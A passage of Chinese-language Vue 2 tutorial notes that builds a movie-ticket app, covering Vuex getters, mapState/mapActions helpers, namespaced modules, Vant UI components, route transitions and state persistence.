    this.$store.dispatch('getCinemaListAsync')
  }
```



后续安装vue-devtools,可以帮助你检测具体调用 了哪个mutations方法，以及vuex的状态变化！

Cinema.vue

```
computed: {
    cinemaArea () {
      const distructArr = this.$store.state.cinemaList.map(item => {
        return item.districtName
      })
      // 需要进行数组去重，获取唯一的影院的区域
      // return Array.from(new Set(distructArr))
      return ['全城', ...new Set(distructArr)]
    },
    getCinemaList () {
      // 当用户点击了区域，currentArea就会更改，计算属性重新计算
      if (this.currentArea === '全城') return this.$store.state.cinemaList
      return this.$store.state.cinemaList.filter(item => { // 从数组里面筛选出符合当前点击的currentArea的数组列表数据
        if (item.districtName === this.currentArea) { // [{distriName:'金山区',name,},{distriname:'金山区'}]
          return true
        } else {
          return false
        }
      })
    }
  },
```



如果在search页面中，直接刷新浏览器，发现获取不到vuex异步的数据了，只是获取到了初始值。





> 面试题： [vuex  vs localstorage的区别？](https://www.cnblogs.com/jsanntq/p/9288144.html)

localStorage是永久性存储，存在客户端本地，不会主动消失，读取速度是比较慢的，多个标签页也会共享数据的。

vuex是状态管理模式，走的是内存，读取速度是比较快。但是浏览器一刷新的时候，数据就会消失了。

vuex是用于解决多组件之间的数据共享的问题，locaStorage主要解决不同页面之间的数据传值问题。



### 7-4 search页面实现

```
<template>
  <div class="search">
    <input type="text" v-model='searchVal'>
    <span>取消</span>
    <div v-show="searchVal">
      <ul>
        <li
          v-for='data in searchCinemaData'
          :key='data.cinemaId'
        >
          <h3>{{data.name}}</h3>
          <p>{{data.address}}</p>
        </li>
      </ul>
      <div v-show='searchCinemaData.length === 0'>
        <img src="https://assets.maizuo.com/h5/v5/public/app/img/rectangle@2x.2bdf0374.png" alt="">
      </div>
    </div>
  </div>
</template>
```

```
data () {
    return {
      searchVal: ''
    }
  },
  computed: {
    searchCinemaData () {
      return this.$store.state.cinemaList.filter(item => {
        return item.name.includes(this.searchVal) ||
              item.name.toUpperCase().includes(this.searchVal.toUpperCase()) ||
              item.address.includes(this.searchVal) ||
              item.address.toUpperCase().includes(this.searchVal.toUpperCase())
      })
    }
  },
```





### 7-5 search的5条数据

```
getCinemaFive () {
      return this.$store.state.cinemaList.slice(0, 5)
    }
```

```
<!--遍历5条数据-->
    <div v-show='!searchVal'>
      <ul>
        <li v-for='data in getCinemaFive' :key='data.cinemaId'>{{data.name}}</li>
      </ul>
    </div>
  </div>
```



如果在其他的组件里面，也需要获取到影院5条数据，也得需要写个计算属性？

vuex允许定义getters(可以理解为store的计算属性)

```
getters: { // 根据state的变化而变化，就会用到getters，就是vuex的计算属性
    getCinemaFive (state) { //就是个计算属性，依赖于vuex的state!
      return state.cinemaList.slice(0, 5)
    }
  },
```

```
<!--遍历5条数据-->
    <div v-show='!searchVal'>
      <ul>
        <li v-for='data in $store.getters.getCinemaFive' :key='data.cinemaId'>{{data.name}}</li>
      </ul>
    </div>
```



后续还可以给getters传递参数：

```
getters:{
 	getCinemaFive(state) {
 		return num => {
 		   return state.cinemaList.slice(0, num)
 		}
    }
}
```

```
<li v-for='data in $store.getters.getCinemaFive(5)' :key='data.cinemaId'>{{data.name}}</li>
```



### 7-6 mapGetters辅助函数

刚刚在search组件中如果想要获取getters? 需要通过this.$store.getters.getCinemaFive.比较麻烦

```
import { mapGetters } from 'vuex'

computed: {
    ...mapGetters(['getCinemaFive']), //注意mapGetters()返回一个对象，需要通过es6的展开运算符将其展开混入到computed中
    searchCinemaData () {
      return this.$store.state.cinemaList.filter(item => {
        return item.name.includes(this.searchVal) ||
              item.name.toUpperCase().includes(this.searchVal.toUpperCase()) ||
              item.address.includes(this.searchVal) ||
              item.address.toUpperCase().includes(this.searchVal.toUpperCase())
      })
    }
  },
```

```
<!--遍历5条数据-->
    <div v-show='!searchVal'>
      <ul>
        <li v-for='data in getCinemaFive(5)' :key='data.cinemaId'>{{data.name}}</li>
      </ul>
    </div>
  </div>
```



### 7-7 mapState辅助函数

在vuex中想要获取vuex的状态? 需要通过this.$store.state.xxx

Search.vue

```
import { mapGetters, mapState } from 'vuex'

computed: {
    ...mapGetters(['getCinemaFive']),
    ...mapState(['cinemaList']),
    searchCinemaData () {
      return this.cinemaList.filter(item => {
        return item.name.includes(this.searchVal) ||
              item.name.toUpperCase().includes(this.searchVal.toUpperCase()) ||
              item.address.includes(this.searchVal) ||
              item.address.toUpperCase().includes(this.searchVal.toUpperCase())
      })
    }
  },
```

```
created () {
    if (this.cinemaList.length === 0) {
      this.$store.dispatch('getCinemaListAsync')
    }
    this.$store.commit('hide')
  },
```



cinema.vue

```
import { mapState } from 'vuex'

computed: {
    ...mapState(['cinemaList']),
    cinemaArea () {
      const distructArr = this.cinemaList.map(item => {
        return item.districtName
      })
      // 需要进行数组去重，获取唯一的影院的区域
      // return Array.from(new Set(distructArr))
      return ['全城', ...new Set(distructArr)]
    },
    getCinemaList () {
      // 当用户点击了区域，currentArea就会更改，计算属性重新计算
      if (this.currentArea === '全城') return this.cinemaList
      return this.cinemaList.filter(item => { // 从数组里面筛选出符合当前点击的currentArea的数组列表数据
        if (item.districtName === this.currentArea) { // [{distriName:'金山区',name,},{distriname:'金山区'}]
          return true
        } else {
          return false
        }
      })
    }
  },
```





### 7-8 modules模块划分

store/tabbar.js

```
const tabbar = {
  state: {
    isTabbarShow: true
  },
  mutations: {
    show (state) {
      state.isTabbarShow = true
    },
    hide (state) {
      state.isTabbarShow = false
    }
  }
}
export default tabbar
```



store/cinema.js

```
import { instance } from '@/utils/http'
const cinema = {
  state: {
    cinemaList: [] // 存储异步的影院数据
  },
  getters: { // 根据state的变化而变化，就会用到getters，就是vuex的计算属性
    getCinemaFive: state => num => state.cinemaList.slice(0, num)
  },
  actions: {
    async getCinemaListAsync (context) {
      const res = await instance.get('https://m.maizuo.com/gateway?cityId=310100&ticketFlag=1&k=99575', {
        headers: {
          'X-Host': 'mall.film-ticket.cinema.list'
        }
      })
      context.commit('setCinemaList', res.data.data.cinemas)
    }
  },
  mutations: {
    setCinemaList (state, cinema) {
      state.cinemaList = cinema
    }
  }
}
export default cinema
```

store/index.js

```
import Vue from 'vue'
import Vuex from 'vuex'
import tabbar from './tabbar'
import cinema from './cinema'
Vue.use(Vuex)
const store = new Vuex.Store({
  modules: { // 合并所有的分支模块
    tabbar,  // mapState('tabbar',['isTabbarShow']) ===> this.$store.state.tabbar.isTabbarShow
    cinema
  }
})
export default store
```





浏览器报错了：

vuex.esm.js:506 [vuex] unknown action type: getCinemaListAsync

```
async created () {
    if (this.cinemaList.length === 0) {
      // 后续分了模块之后，需要写模块名才可以
      this.$store.dispatch('cinema/getCinemaListAsync')
    }
  }
```



```
 computed: {
    ...mapState('cinema', ['cinemaList']), // 获取vuex状态也得需要指明哪个模块里面的哪个状态
```



 module namespace not found in mapState(): cinema/

```
 namespaced: true, // 开启命名空间
```





Search.vue

```
computed: {
    ...mapGetters('cinema', ['getCinemaFive']),
    ...mapState('cinema', ['cinemaList']),
    searchCinemaData () {
      return this.cinemaList.filter(item => {
        return item.name.includes(this.searchVal) ||
              item.name.toUpperCase().includes(this.searchVal.toUpperCase()) ||
              item.address.includes(this.searchVal) ||
              item.address.toUpperCase().includes(this.searchVal.toUpperCase())
      })
    }
  },
  created () {
    if (this.cinemaList.length === 0) {
      this.$store.dispatch('cinema/getCinemaListAsync')
    }
    this.$store.commit('tabbar/hide')
  },
  beforeDestroy () {
    this.$store.commit('tabbar/show')
  }
```



App.vue

```
 <!-- <Tabbar v-if='$store.state.tabbar.isTabbarShow'></Tabbar> -->
    <Tabbar v-if='isTabbarShow'></Tabbar>
```

```
import Tabbar from '@/components/tabbar'
import { mapState } from 'vuex'
export default {
  components: {
    Tabbar
  },
  computed: mapState('tabbar', ['isTabbarShow'])
}
```



### 7-9 mapActions辅助函数

如果划分模块了，后续派发action，之前是this.$store.dispatch('cinema/getCinemaListAsync')

```
import { mapState, mapActions } from 'vuex'

 methods: {
    ...mapActions('cinema', ['getCinemaListAsync']), //注意，在methods中注册
    toSearch () {
      this.$router.push('/cinema/search')
    }
  },
  
  async created () {
    if (this.cinemaList.length === 0) {
      // this.$store.dispatch('cinema/getCinemaListAsync')
      this.getCinemaListAsync()
    }
  }
```





### 7-10 mapMutations辅助函数

如果划分模块了，后续在组件中调用更改state的mutations，之前是this.$store.commit('tabbar/hide')

Search.vue

```
import { mapGetters, mapState, mapActions, mapMutations } from 'vuex'

 methods: {
    ...mapActions('cinema', ['getCinemaListAsync']),
    ...mapMutations('tabbar', ['hide', 'show'])
  },
 created () {
    if (this.cinemaList.length === 0) {
      this.getCinemaListAsync()
    }
    this.hide()
  },
  beforeDestroy () {
    // this.$store.commit('tabbar/show')
    this.show()
  }
```





## 八. Vant组件库使用

### 8-1 vant的安装使用

https://vant-contrib.gitee.io/vant/#/zh-CN/

yarn add vant 

yarn add babel-plugin-import -D



bable.config.js

```
module.exports = {
  plugins: [
    ['import', {
      libraryName: 'vant',
      libraryDirectory: 'es',
      style: true
    }, 'vant']
  ],
  presets: [
    '@vue/cli-plugin-babel/preset'
  ]
}
```

配置文件更改了，需要重启启动服务器，yarn serve





### 8-2 search里面使用

```
import Vue from 'vue'
import { Search } from 'vant'
Vue.use(Search)
```

```
<van-search
      v-model="searchVal"
      show-action
      placeholder="请输入搜索关键词"
      @cancel="onCancel"
      @blur='onBlur'
    />
```

```
methods: {
    ...mapActions('cinema', ['getCinemaListAsync']),
    ...mapMutations('tabbar', ['hide', 'show']),
    onCancel () {
      this.$router.back()
    },
    onBlur () {
      console.log('失去焦点了....')
    }
  },
```



后续可以采用van-cell组件：

```
import Vue from 'vue'
import { Search, Cell, Tag, Icon } from 'vant'
Vue.use(Search).use(Cell).use(Tag).use(Icon)
```

```
<!--遍历5条数据-->
    <div v-show='!searchVal'>
      <ul>
        <van-cell
          v-for='data in getCinemaFive(5)'
          :key='data.cinemaId'
          :title='xxx'
          :label='xxx'
        >
          <!-- 使用 title 插槽来自定义标题 v-slot:title === #title -->
          <template #title>
            <span class="custom-title">{{data.name}}</span>
            <van-tag type="danger">风险地区</van-tag>
          </template>
          <template v-slot:icon>
            <van-icon name="shop-collect-o" color="#ee0a24"/>
          </template>
        </van-cell>
      </ul>
    </div>
```





### 8-3 login页面使用vant

```
<template>
    <van-form @submit="onSubmit">
      <van-field
        v-model="username"
        name="用户名"
        label="用户名"
        placeholder="用户名"
        :rules="[
          { required: true, message: '请填写用户名' },
          { pattern, message: '正则匹配不对....' }
        ]"
        ref='username'
      />
      <van-field
        v-model="password"
        type="password"
        name="密码"
        label="密码"
        placeholder="密码"
        :rules="[
          { required: true, message: '请填写密码' },
          { validator, message: 'valicator函数校验失败' }
        ]"
        ref='password'
      />
      <div style="margin: 16px;">
        <van-button round block type="info" native-type="submit">提交</van-button>
      </div>
    </van-form>
</template>

```

```
import { instance2 } from '@/utils/http'
import { Button, Form, Field, Toast, Dialog } from 'vant'
import Vue from 'vue'
Vue.use(Button)
Vue.use(Form)
Vue.use(Field)
export default {
  data () {
    return {
      username: '',
      password: '',
      pattern: /^\w{3,}$/
    }
  },
  methods: {
    validator (val) {
      return new Promise((resolve) => {
        Toast.loading('验证中...')
        setTimeout(() => {
          Toast.clear()
          resolve(/\d{1}/.test(val))
        }, 3000)
      })
    },
    onSubmit () {
      instance2.post('/api/user/signin', {
        username: this.username,
        password: this.password
      }).then(res => {
        localStorage.setItem('token', res.token)
        this.$router.push(this.$route.query.redirect)
      }).catch(() => {
        Dialog.alert({
          title: '注意了！！！',
          message: '用户名或者密码输入失败...',
          theme: 'round-button'
        }).then(() => {
          this.username = ''
          this.password = ''
          this.$refs.username.focus() // 查找了Field组件的api，里面提供了一个叫做focus方法
        })
      })
    }
  }
}
```



### 8-4 nowplaying使用List

```
import Vue from 'vue'
import { List, Cell } from 'vant'
Vue.use(List).use(Cell)
```

```
 <van-list
      v-model="loading"
      :finished="finished"
      finished-text="没有更多了"
      @load="onLoad"
      offset="50"
    >
      <van-cell v-for='data in dataList' :key='data.filmId' :title="data.name" />
 </van-list>
```

```
 data () {
    return {
      dataList: [],
      loading: false, // 默认代表不加载
      finished: false, // 还有数据
      pageNum: 1, // 第一页
      pageSize: 10 // 10条数据
    }
  },
```

```
methods: {
    async onLoad () {
      const res = await instance.get(`https://m.maizuo.com/gateway?cityId=310100&pageNum=${this.pageNum}&pageSize=${this.pageSize}&type=1&k=4475560`, {
        headers: {
          'X-Host': 'mall.film-ticket.film.list'
        }
      })
      this.dataList = this.dataList.concat(res.data.data.films) // 将下一页的数据数组追加到this.datalist中

      // 加载状态需要变成结束
      this.loading = false

      // 判断如果没有数据了，需要将finished变成true,onLoad方法就不会触发了
      if (this.pageNum * this.pageSize >= res.data.data.total) {
        this.finished = true
      }

      // 让页码+1
      this.pageNum++
    }
  }
```





完善：

```
 <van-list
      v-model="loading"
      :finished="finished"
      finished-text="没有更多了"
      @load="onLoad"
      offset="50"
    >
      <FilmItem
        v-for='data in dataList'
        :key='data.filmId'
        :data='data'
      ></FilmItem>
    </van-list>
  </div>
```

过滤器报错了，map问题！ filters.js

```
// 定义演员的过滤器
Vue.filter('filterActors', (actors, options = ' ') => {
  if (actors) {
    return actors.map(item => {
      return item.name
    }).join(options)
  } else {
    return '暂无主演'
  }
})
```



### 8-5 转场动画实现

app.vue

```
<!--需要借助vue-router提供的核心标签 router-view将对应的组件进行渲染-->
    <transition name='app' mode='out-in'>
      <router-view></router-view>    
    </transition>
```

```
<style>
  .app-enter-active{
    animation: move .66s;
  }
  .app-leave-active{
    animation: move .66s reverse;
  }

  @keyframes move{
    0%{
      transform: translateY(20px);
      opacity: 0;
    }
    100%{
      transform: translateY(0px);
      opacity: 1;
    }
  }
</style>
```





### 8-6 城市页面实现

```
<div class="left" @click='toPage("/city")'>上海</div>
```

```
methods: {
    ...mapActions('cinema', ['getCinemaListAsync']),
    toPage (path) {
      this.$router.push(path)
    }
  },
```



City.vue

```
<template>
  <div class="city">
    <van-index-bar>
      <div v-for='(data,index) in cities' :key='index'>
        <van-index-anchor :index="data.index" />
        <van-cell v-for='(item,index) in data.list' :key='index' :title="item.name" />
      </div>
    </van-index-bar>
  </div>
</template>

<script>
import Vue from 'vue'
import { instance } from '@/utils/http'
import { IndexBar, IndexAnchor, Cell } from 'vant'
Vue.use(IndexBar)
Vue.use(IndexAnchor)
Vue.use(Cell)
export default {
  data () {
    return {
      cities: [
        // { index: 'A', list: [ {cityId: 110100, name: "北京", pinyin: "beijing", isHot: 1}] }
      ]
    }
  },
  methods: {
    filterData (cities) { // cities = [{name,id,ishost,pinyin:'anshan'}]  ===> [{index:A,list:[]}]
      const letterArr = []
      const cityArr = []
      for (let i = 65; i <= 90; i++) {
        letterArr.push(String.fromCharCode(i))
      }

      // 需要根据cities进行字母筛选
      for (let i = 0; i < letterArr.length; i++) {
        // 从字母中查询cities符合的城市
        const tempArr = cities.filter(item => item.pinyin.substring(0, 1).toUpperCase() === letterArr[i])
        cityArr.push({
          index: letterArr[i],
          list: tempArr
        })
      }
      this.cities = cityArr
    }
  },
  async created () {
    const res = await instance.get('https://m.maizuo.com/gateway?k=9523152', {
      headers: {
        'X-Host': 'mall.film-ticket.city.list'
      }
    })
    this.filterData(res.data.data.cities)
  }
}
</script>
```





索引实现：

```
data () {
    return {
      indexList: [],
      cities: [
        // { index: 'A', list: [ {cityId: 110100, name: "北京", pinyin: "beijing", isHot: 1}] }
      ]
    }
  },
```

```
<van-index-bar :index-list="indexList" :sticky-offset-top='30' @select="selectme">
```

```
if (tempArr.length) { // 如果cities里面有字母对应的城市的话，再去push
          cityArr.push({
            index: letterArr[i],
            list: tempArr
          })
          // 更改indexList
          this.indexList.push(letterArr[i])
        }
```

```
selectme (num) {
      Toast({
        message: num,
        className: 'my-toast'
      })
    },
```



热门城市实现：

```
<div>
      <h4>热门城市</h4>
      <ul>
        <li v-for='city in getHotCity' :key='city.cityId'>{{city.name}}</li>
      </ul>
    </div>
```

```
data () {
    return {
      indexList: [],
      cities: [],
      allCities: []
    }
  },
  computed: {
    getHotCity () {
      return this.allCities.filter(item => {
        return item.isHot === 1
      })
    }
  },
```



### 8-7 vuex管理城市状态

store/city.js

```
const tabbar = {
  namespaced: true, // 开启命名空间
  state: {
    cityName: '上海'
  },
  mutations: {
    setCityName (state, cityName) {
      state.cityName = cityName
    }
  }
}
export default tabbar
```



store/index.js

```
import Vue from 'vue'
import Vuex from 'vuex'
import tabbar from './tabbar'
import cinema from './cinema'
import city from './city'
Vue.use(Vuex)
const store = new Vuex.Store({
  modules: {
    tabbar,
    cinema,
    city
  }
})
export default store

```



cinema.vue

```
 computed: {
    ...mapState('cinema', ['cinemaList']),
    ...mapState('city', ['cityName']),
```

```
<div class="left" @click='toPage("/city")'>{{cityName}}</div>
```



City.vue

```
import { mapMutations } from 'vuex'

 methods: {
    ...mapMutations('city', ['setCityName']), //后续需要用到city模块的setCityName这个mutations方法
    clickCity (item) {
      // 需要将vuex的cityName更改为用户点击的item.name
      this.setCityName(item.name)
      // 编程式导航跳转到影院页面
      this.$router.push('/cinema')
    },
```





城市名字改完了，回到cinema页面，发现数据还是上海的？因为在cinema模块的actions里面有cityId，需要外部传入。

store/cinema.js

```
 actions: {
    async getCinemaListAsync (context, cityId) {
      const res = await instance.get('https://m.maizuo.com/gateway?cityId=' + cityId + '&ticketFlag=1&k=99575', {
        headers: {
          'X-Host': 'mall.film-ticket.cinema.list'
        }
      })
      context.commit('setCinemaList', res.data.data.cinemas)
    }
  },
```



store/city.js

```
const tabbar = {
  namespaced: true, // 开启命名空间
  state: {
    cityName: '上海',
    cityId: '310100'
  },
  mutations: {
    setCityName (state, cityName) {
      state.cityName = cityName
    },
    setCityId (state, cityId) {
      state.cityId = cityId
    }
  }
}
export default tabbar
```



city.vue

```
methods: {
    ...mapMutations('city', ['setCityName', 'setCityId']),
    clickCity (item) {
      this.setCityName(item.name)
      this.setCityId(item.cityId)
      // 编程式导航跳转到影院页面
      this.$router.push('/cinema')
    },
```



cinema.vue

```
computed: {
    ...mapState('cinema', ['cinemaList']),
    ...mapState('city', ['cityName', 'cityId']),
    
async created () {
    if (this.cinemaList.length === 0) {
      this.getCinemaListAsync(this.cityId)
    }
  }
```



发现还是请求的是上海的数据？

因为进入cinema的时候，created钩子函数判断vuex的cinemaList数据是否存在，如果不存在进行异步ajax.后续获取到了上海的数据了。

接下来当我们选择城市的时候，选择完毕后，进入到cinema页面中，又会判断cinemaList状态是否有数据，发现有了上海的数据了，就不会再去将新的城市的id请求了。

解决？ 当你选择完毕城市的时候，只需要将cinemaList数组变成空数组即可。后续进入到cinema页面的时候，created判断数组长度如果为空，就会重新ajax请求。

city.vue

```
methods: {
    ...mapMutations('city', ['setCityName', 'setCityId']),
    ...mapMutations('cinema', ['setCinemaList']),
    clickCity (item) {
      // 需要将vuex的cityName更改为用户点击的item.name
      this.setCityName(item.name)
      this.setCityId(item.cityId)
      // 将cinemaList数组变成空数组即可
      this.setCinemaList([])
      // 编程式导航跳转到影院页面
      this.$router.push('/cinema')
    },
```





Cinema.vue

可以借助Toast实现数据请求的loading提示

```
async created () {
    if (this.cinemaList.length === 0) {
      // 在发送异步请求之前需要出现loading框
      Toast.loading({
        message: '加载中...',
        overlay: true,
        icon: 'like-o',
        duration: 0
      })
      this.getCinemaListAsync(this.cityId).then(res => {
        // 数据请求完毕了，需要手动关闭toast
        Toast.clear()
      })
    }
  }
```





nowplaying.vue

```
import { mapState } from 'vuex'

computed: {
    ...mapState('city', ['cityId'])
  },
  
const res = await instance.get(`https://m.maizuo.com/gateway?cityId=${this.cityId}&pageNum=${this.pageNum}&pageSize=${this.pageSize}&type=1&k=4475560`, {
```





detail.vue

进行了图片预览功能

```
<SwiperCom cName='photos'>
        <div
          class="swiper-slide"
          v-for='(photo,index) in filmInfo.photos'
          :key='photo'
          @click='clickPhoto(filmInfo.photos,index)'
        >
          <img :src="photo" alt="">
        </div>
      </SwiperCom>
```

```
clickPhoto (photos, index) {
      ImagePreview({
        images: photos,
        startPosition: index,
        closeable: true,
        closeIconPosition: 'top-left',
        closeIcon: 'https://img0.baidu.com/it/u=2167159898,2061273097&fm=26&fmt=auto'
      })
    },
```



photos.vue

```
 <li v-for='(photo,index) in photos' :key='photo' @click='clickPhotos(photos,index)'>
            <img :src="photo" alt="">
        </li>
```

```
 methods: {
    clickPhotos (photos, index) {
      // 触发自定义事件
      this.$emit('change', photos, index)
    }
  }
```

```
<Photos @change='clickPhoto' v-if='filmInfo.photos' v-show='isShow' :photos='filmInfo.photos'>
      <mz-title @change='back2' name='剧照(5)'></mz-title>
    </Photos>
```



### 8-8 vuex的持久化

vuex数据存在内存里面的，浏览器刷新的时候，数据就会重置了。

后续同步到localstorage中，一旦浏览器刷新的时候，判断vuex的数据是不是初始值，如果是的话，从本地存储获取使用。

yarn add [vuex-persistedstate](https://www.npmjs.com/package/vuex-persistedstate)

store.js

```
import createPersistedState from 'vuex-persistedstate'
Vue.use(Vuex)
const store = new Vuex.Store({
  plugins: [createPersistedState()],
  modules: {
    tabbar,
    cinema,
    city
  }
})
```

